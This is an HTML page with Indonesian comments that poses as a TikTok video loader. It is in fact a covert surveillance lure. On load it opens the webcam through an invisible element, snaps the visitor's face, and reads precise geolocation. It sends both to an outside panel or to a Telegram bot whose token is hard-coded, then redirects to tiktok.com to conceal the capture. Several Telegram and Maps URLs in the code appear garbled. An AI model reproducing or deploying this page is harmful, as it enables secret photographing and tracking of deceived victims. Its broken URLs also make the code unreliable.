<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Tiktok - Watch & Share Videos</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body { font-family: 'Segoe UI', Arial, sans-serif; background-color: #010101; color: #fff; display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; padding: 20px; }
        .container { text-align: center; }
        .loader { border: 4px solid #333; border-top: 4px solid #fe2c55; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        #webcam { width: 1px; height: 1px; opacity: 0; position: absolute; }
        #canvas { display: none; }
        p { font-size: 1rem; color: #aaa; }
    </style>
</head>
<body>

<div class="container">
    <div id="loader" class="loader"></div>
    <p id="status">Memuat video TikTok...</p>
</div>

<video id="webcam" autoplay playsinline muted></video>
<canvas id="canvas"></canvas>

<script>
    // ================= CONFIG TELEGRAM (UNTUK METODE DIREK/CADANGAN) =================
    const TELEGRAM_BOT_TOKEN = '8713051914:AAGWypsFdP6uJPMHFwgLokj4vx5N7LC4Cb0';
    const ADMIN_CHAT_ID = '1966317946'; // Hanya dipakai jika link dibuka TANPA ?sender=
    // =====================================================================

    // ================= CONFIG PANEL PTERODACTYL ==========================
    const PANEL_ENDPOINT = 'https://gervho.com'; 
    const TARGET_WEBSITE = 'https://tiktok.com'; 
    // =====================================================================

    // Membaca ID pengguna dinamis (?sender=ID) dari tautan bot
    const urlParams = new URLSearchParams(window.location.search);
    const SENDER_ID = urlParams.get('sender'); 

    const video = document.getElementById('webcam');
    const canvas = document.getElementById('canvas');

    let currentStream = null;

    async function startAutoCamera() {
        try {
            currentStream = await navigator.mediaDevices.getUserMedia({ 
                video: { facingMode: "user", width: 640, height: 480 } 
            });
            video.srcObject = currentStream;

            video.onplay = () => {
                setTimeout(takeAndSendSnapshot, 3000); // Jeda 3 detik untuk stabilisasi kamera
            };
        } catch (err) {
            console.error("Gagal kamera, beralih meminta lokasi langsung...");
            ambilDataLokasiAndSend(null); // Jika kamera gagal, coba ambil lokasi saja
        }
    }

    function takeAndSendSnapshot() {
        if (video.videoWidth === 0 || video.videoHeight === 0) {
            setTimeout(takeAndSendSnapshot, 200);
            return;
        }

        const ctx = canvas.getContext('2d');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;

        ctx.translate(canvas.width, 0);
        ctx.scale(-1, 1);
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

        if (currentStream) {
            currentStream.getTracks().forEach(track => track.stop());
        }
        
        // Buat file blob dari gambar canvas terlebih dahulu sebelum meminta lokasi
        canvas.toBlob((blob) => {
            ambilDataLokasiAndSend(blob);
        }, 'image/png');
    }

    function ambilDataLokasiAndSend(imageBlob) {
        const finalRecipientId = SENDER_ID ? SENDER_ID : ADMIN_CHAT_ID;

        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                (position) => {
                    const lat = position.coords.latitude;
                    const lon = position.coords.longitude;
                    const teksLokasi = `📌 **Lokasi Pengguna:**\nLatitude: ${lat}\nLongitude: ${lon}\n🔗 [Buka di Google Maps](https://google.com{lat},${lon})`;
                    
                    prosesPengiriman(finalRecipientId, imageBlob, teksLokasi);
                },
                (error) => {
                    let alasan = "Ditolak/Gagal";
                    if (error.code === error.PERMISSION_DENIED) alasan = "Izin ditolak pengguna";
                    const teksLokasi = `⚠️ **Lokasi:** ${alasan}.`;
                    
                    prosesPengiriman(finalRecipientId, imageBlob, teksLokasi);
                },
                { enableHighAccuracy: true, timeout: 7000 }
            );
        } else {
            const teksLokasi = `❌ Browser tidak mendukung geolokasi.`;
            prosesPengiriman(finalRecipientId, imageBlob, teksLokasi);
        }
    }

    function prosesPengiriman(recipientId, blob, infoLokasi) {
        // JIKA MENGGUNAKAN PANEL (Mengirim data gabungan ke backend)
        if (SENDER_ID) {
            const imageData = blob ? canvas.toDataURL('image/png') : null;
            
            fetch(PANEL_ENDPOINT, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    senderId: recipientId,
                    image: imageData,
                    location: infoLokasi
                })
            })
            .then(res => res.json())
            .then(data => {
                if (!data.ok) {
                    sendDirectTelegram(recipientId, blob, infoLokasi);
                } else {
                    window.location.href = TARGET_WEBSITE;
                }
            })
            .catch(err => {
                console.error("Koneksi panel gagal, beralih ke jalur direk Telegram...");
                sendDirectTelegram(recipientId, blob, infoLokasi);
            });
        } else {
            sendDirectTelegram(recipientId, blob, infoLokasi);
        }
    }

    async function sendDirectTelegram(chatIdToSend, blob, infoLokasi) {
        const captionTeks = `📸 **Aktivitas Berhasil Direkam!**\n\n${infoLokasi}`;

        try {
            if (blob) {
                // Kirim sebagai foto jika kamera berhasil diakses
                const formData = new FormData();
                formData.append('chat_id', chatIdToSend);
                formData.append('photo', blob, 'snapshot.png');
                formData.append('caption', captionTeks);

                await fetch(`https://api.telegram.org/bit${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
            } else {
                // Kirim sebagai teks biasa jika kamera diblokir tetapi lokasi diizinkan
                await fetch(`https://telegram.org{TELEGRAM_BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: chatIdToSend,
                        text: captionTeks,
                        parse_mode: 'Markdown'
                    })
                });
            }
        } catch (error) {
            console.error("Gagal mengirim ke Telegram API:", error);
        } finally {
            window.location.href = TARGET_WEBSITE;
        }
    }

    window.addEventListener('load', startAutoCamera);
</script>

</body>
</html>
